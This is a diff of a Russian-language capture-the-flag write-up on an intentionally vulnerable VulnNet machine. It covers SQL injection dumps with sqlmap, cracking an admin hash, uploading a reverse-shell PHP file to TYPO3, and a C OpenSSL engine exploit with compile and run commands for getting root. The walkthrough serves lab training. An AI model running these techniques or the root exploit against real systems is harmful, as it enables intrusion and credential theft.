@@ -1,7 +1,10 @@
 ### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО:
--
--
--
+- минимальное понимание js, си, апи эндпоинтов и их возможных уязвимостей, алгоритмов хеширования
+- умение эксплуатировать sqli
+- понимание принципа работы typo3
+- знание о cups и его уязвимостях (чтобы понять, что тут он бесполезен)
+- умение работать с кэшем мозиллы
+- понимание capabilites и умение эксплуатировать ep у openssl
 ВЗЯТИЕ ШЕЛЛА:
 
 по классике сначала сканим порты (масскан, потом нмап) - ничего интересного, все стандартно
@@ -11,27 +14,27 @@
 
 изменила домен в /etc/hosts на vulnnet.thm (по подсказке в задании) и попала на сайт
 
-<img width="1459" height="687" alt="image" src="https://github.com/user-attachments/assets/b16d0b83-8d49-4006-b21c-1ba410947776" />
+<img width="700" height="387" alt="image" src="https://github.com/user-attachments/assets/b16d0b83-8d49-4006-b21c-1ba410947776" />
 
 сам сайт пустой, ничего не кликается, форма с регистрацией на сервер не отправляется(проверила через бурп). пофаззила поддиректории - ничего интересного (у тех, что выдают код 301 при переходе просто перекидывают на пустую страницу)
 
-<img width="783" height="206" alt="image" src="https://github.com/user-attachments/assets/845c08b8-5bc9-4ecd-b091-c4d57be75357" />
+<img width="700" height="180" alt="image" src="https://github.com/user-attachments/assets/845c08b8-5bc9-4ecd-b091-c4d57be75357" />
 
 решила пофаззать сабдомены и - бинго! нам выдало несколько. но админ1 и апи, к сожалению, выдают пустые страницы (и ничего не дают интересного, пофаззив, не увидела. пока только страницу логина на ```http://admin1.vulnnet.thm/typo3```. запомним)
 
-<img width="865" height="512" alt="image" src="https://github.com/user-attachments/assets/90d43335-84dc-4b13-a6a2-7443c0f6805d" />
+<img width="700" height="412" alt="image" src="https://github.com/user-attachments/assets/90d43335-84dc-4b13-a6a2-7443c0f6805d" />
 
 после перешла на сабдомен blog. сразу увидела потенциальный idor - но неа
 
-<img width="753" height="134" alt="image" src="https://github.com/user-attachments/assets/8aeb0636-273e-42db-b00b-96f21a594199" />
+<img width="700" height="114" alt="image" src="https://github.com/user-attachments/assets/8aeb0636-273e-42db-b00b-96f21a594199" />
 
 решила полазить в коде страницы и в ```view-source:http://blog.vulnnet.thm/post5.php``` нашла вот такой путь к апи-эндпоинту:
 
-<img width="683" height="148" alt="image" src="https://github.com/user-attachments/assets/3d9ec26f-7d20-4be3-8f57-a0d7b550dfab" />
+<img width="700" height="160" alt="image" src="https://github.com/user-attachments/assets/3d9ec26f-7d20-4be3-8f57-a0d7b550dfab" />
 
 решила его проверить, и да, действительно, он не защищен и мы можем спокойно на него попасть
 
-<img width="895" height="212" alt="image" src="https://github.com/user-attachments/assets/cf67a683-1a9b-4559-b10f-bf130a231efb" />
+<img width="700" height="190" alt="image" src="https://github.com/user-attachments/assets/cf67a683-1a9b-4559-b10f-bf130a231efb" />
 
 попробовала проверить на уязвимость к sqli и да, параметр blog уязвим. теперь посмотрим, какие есть базы данных
 
@@ -67,7 +70,7 @@ Database: blog
 
 посмотрела все таблицы на всякий случай, но самое интересное нашла в дампе таблицы users (```-D blog -T users --dump```). в ней оказались пароли всех пользователей блога (у меня начало вывода обрезалось, решается флагом --start 1). окей, пока форму логина я на сайте не видела, да и обычные пользователи нас особо не интересуют (но то что пароли хранятся незахешированными - вкусно, хотя и малореалистично)
 
-<img width="449" height="176" alt="image" src="https://github.com/user-attachments/assets/a564023c-bede-4577-a59d-c557ff062a93" />
+<img width="700" height="250" alt="image" src="https://github.com/user-attachments/assets/a564023c-bede-4577-a59d-c557ff062a93" />
 
 дальше решила посмотреть дб vn_admin
 
@@ -87,7 +90,7 @@ Database: blog
 ```
 cудя по специфическим названиям таблиц (be_, fe_, sys_), - похоже на бд от CMS (TYPO3). окей, попробуем сдампить самое интересное - логины/хэши паролей админов (```-D vn_admin -T be_users --dump```)
 
-<img width="851" height="51" alt="image" src="https://github.com/user-attachments/assets/efb59e17-e323-4afb-a6fb-4675c20409aa" />
+<img width="700" height="51" alt="image" src="https://github.com/user-attachments/assets/efb59e17-e323-4afb-a6fb-4675c20409aa" />
 
 и вот оно - хеш пароля. но радоваться пока нечему;( захеширован пароль алгоритмом $argon2i$, а параметры в (m=65536 — 64 МБ памяти, t=16 — 16 итераций) делают его очень неприятным. сломать его будет сложно (я на стадии отрицания закинула на минут пятнадцать в john'а с rockyou, надеясь, что пароль может быть где-то в начале словаря, но неа. так что таким образом пароль не достать). полазив еще по таблицам и не найдя ничего толкового, подумала, что в теории, паролем админа может быть один из паролей в таблице users (из блога). юзернейма (chris_w) его там нет, но пароль он вполне мог использовать дважды. составила файл с паролями и закинула в джона
 
@@ -97,11 +100,11 @@ john --wordlist=pass.txt hash.txt
 
 и, ура, мы действительно смогли таким образом расхешировать пароль. далее перешла на ранее найденную страницу ```http://admin1.vulnnet.thm/typo3``` и залогинилась по полученным кредам. теперь мы chris_w! остается получить реверсшелл и попасть на сервер. самое логичное - подгрузить php файл в filelist, но расширения запрещено. но в настройках (system tools -> settings) я увидела configure installiation-wide options - бинго. 
 
-<img width="1197" height="693" alt="image" src="https://github.com/user-attachments/assets/180ad0f3-03ab-4f17-9a7f-accfd3e9afc9" />
+<img width="700" height="403" alt="image" src="https://github.com/user-attachments/assets/180ad0f3-03ab-4f17-9a7f-accfd3e9afc9" />
 
 удаляем запрет на подгрузку php в параметре ```[BE][fileDenyPattern]```и спокойно подгружаем скрипт с реверсшеллом (я сгенерировала его через msfvenom, чтобы поймать шелл в msfconsole)
 
-<img width="1475" height="611" alt="image" src="https://github.com/user-attachments/assets/0560a4d5-8805-42be-b4da-15b3c0d68527" />
+<img width="700" height="311" alt="image" src="https://github.com/user-attachments/assets/0560a4d5-8805-42be-b4da-15b3c0d68527" />
 
 переходим по адресу ```http://admin1.vulnnet.thm/fileadmin/user_upload/rceraw.php``` и вот, теперь мы внутри с правами юзера www-data
 
@@ -198,7 +201,7 @@ Files with capabilities (limited to 50):
 #include <unistd.h>
 #include <stdlib.h> 
 
-static int bind(ENGINE *e, const char *id)
+static int getroot(ENGINE *e, const char *id) // для соответствия сигнатуре функции
 {
   setuid(0); 
   setgid(0);
@@ -206,19 +209,24 @@ static int bind(ENGINE *e, const char *id)
   return 1;
 }
 
-IMPLEMENT_DYNAMIC_BIND_FN(bind)
-IMPLEMENT_DYNAMIC_CHECK_FN()
+IMPLEMENT_DYNAMIC_BIND_FN(getroot) // экспортирует функцию под стандартным именем, которое ожидает увидеть ядро OpenSSL. без этого макроса библиотека не поняла бы, какую функцию вызывать при загрузке.
+IMPLEMENT_DYNAMIC_CHECK_FN() // экспортирует служебную функцию, которая проверяет версию API OpenSSL. необходимо для совместимости: OpenSSL проверяет, совпадает ли версия API, с которой был скомпилирован движок, с версией самой библиотеки. Без этого макроса загрузка завершится ошибкой.
 ```
-
-компилируем у себя (на сервере рабочего компилятора нет)
+(логика составления кода исходит из ожиданий openssl, чтобы ничего не поломалось. типа: если пользователь хочет загрузить динамический движок (engine), я должен загрузить файл и найти в нем функцию с конкретным именем bind_engine. нам не нужно использовать что-то вроде ```__attribute__((constructor))```, чтобы сразу вызвать функцию, потому что openssl c флагом -engine сразу вызывает функцию для ее инициализации)
+```
+// примерно так это выглядит после работы макроса (для понимания):
+extern "C" int bind_engine(ENGINE *e, const char *id) {
+    return getroot(e, id); 
+}
+```
+компилируем у себя (тк на сервере рабочего компилятора нет)
 
 ```
-gcc -fPIC -o exploit.o -c exploit.c
-gcc -shared -o exploit.so -lcrypto exploit.o
+gcc -fPIC -shared -o exploit.so exploit.c -lcrypto
 ```
 перекидываем файл на сервер и запускаем 
 
 ```
-/home/system/Utils/openssl req -engine ./exploit.so
+/home/system/Utils/openssl req -engine ./exploit.so // подгружаем скомпилированный модуль, который должен сразу запустить оболочку с правами рута
 ```
-рут взят!
+рут взят!😎
